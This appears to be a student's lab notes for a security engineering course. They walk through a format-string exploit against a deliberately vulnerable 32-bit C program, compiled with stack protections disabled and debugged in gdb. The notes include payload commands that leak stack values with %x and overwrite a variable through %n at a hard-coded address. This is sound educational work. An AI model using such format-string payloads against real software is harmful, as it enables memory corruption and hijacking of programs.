# sec_engineering_exercises

## Format string exploitation example (Section 2.5)
1. Create a c file like, for example with vi: `vi vuln_s.c`
   Content for the file: [vuln_s.c](vuln_s.c) 

2. Set environment flags
`export CFLAGS="-m32 -fno-stack-protector -z execstack -fno-PIE -no-pie -g -std=c99"`
3. Compile the file with GCC to create an executable object
```
    gcc -g -o vuln vuln_s.c -m32 -fno-stack-protector -z execstack -fno-pie -no-pie -std=c99
```
or (Im not sure this worked for me, this doesn't work for me now so better to use the above)
```
   gcc -g -o vuln vuln_s.c $CFLAGS
```
4. Execute the file to ensure its working
```
   ./vuln test
```
Expected output: ![Alt text](image.png)

5. Open program in debugger
```
    gdb vuln
```
   Check the file was complied correctly for the debugger by running
   ```
      list
   ```
   You should see your code when you run that, if you don't something with flags went wrong.
   
6. Run the program with '%x' which will return data from the stack - the hexadecimal value of the stack
```
    run %x
```
Expected output: ![Alt text](image-1.png)

7. Add a breakpoint at line 14 (where the call is made from the **main** function to the **vuln** function)
```
    break 7
```
8. Run the program again
```
    run %x
```
Expected output:![Alt text](image-2.png)

9. Check the content on the %esp registers by running
```
    x/100x $esp
```
Should return: ![Alt text](image-3.png)

10. So the **str** is located that **0xbffff789** and the '**%x'** value **(0x4020e3fc)** at **0xbffff550**
    The distance between str and %x is **0xbffff789 - 0xbffff550 = 569** (https://www.calculator.net/hex-calculator.html?number1=bffff789&c2op=-&number2=bffff550&calctype=op&x=50&y=20)
    We want a number that is divisible by 4 (4 bytes) so will round 569 to 572 and then 572 / 4 = 143
    That means that the **'target'** variable is around 143 positions away from the start of the stack (in the bss section)
    We can run a command that will bring us hexadecimal values up 143 stack positions

11. Try and fail
    Start the new debugging of the program so you are not stopped by the break (there must be a way to remove the break ;)) (Use 'q' to quickly and then start from fresh in gdb)
    
    Try 143 spaces and see if you can see **414141** (representation of AAAA) (the number might be different for you depending on the distance)
```
     run `(python -c 'print "AAAA" + ".%x." * 143+"%x"')`
```

The output will be something like this: ![Alt text](image-4.png)
    
Next I try to increase 143 to 146

```
     run `(python -c 'print "AAAA" + ".%x." * 146+"%x"')`
```
Output: ![Alt text](image-5.png)

Ok, I can now see the hexadecimal representation of AAAA but it is not at the end of the output, I need to get rid of the '00' so that my last 4bits point exactly to AAAA

Try with adding extra padding (BB):
```
    run `(python -c 'print "AAAA" +"BBB"+ "%x." * 146+"%x"')`
```
   ![Alt text](image-8.png)
My pointer is now pointing to the hexadecimal representation of 'AAAA' exactly

12. Replace AAAA with the address of the 'target' variable 
    To find the target variable type: '''p &target '''
    The output should be:![Alt text](image-7.png)

13. Do the hack 
- Replace the 'AAAA' in the run command with the address (its read from the back for fun)
- replace last '%x' with '%n' (x is reading and n is writing)
- run it
```
    run `(python -c 'print "\x28\xa0\x04\x08" +"BBB"+ "%x." * 146+"%n"')`
```
Output:![Alt text](image-9.png)
14. Extra: see the value of target changing
- add break at line 5
- add break at line 15
- run run `(python -c 'print "\x28\xa0\x04\x08" +"BBB"+ "%x." * 146+"%n"')`
- on the first breakpoint type: print target - the value should be 0 
- type: '''next'''
- type: '''next'''
- print target - the value should be changed
![Alt text](image-10.png)


##Outstanding questions
- I still don't get the addresses and why if I change AAAA to the exact address it works



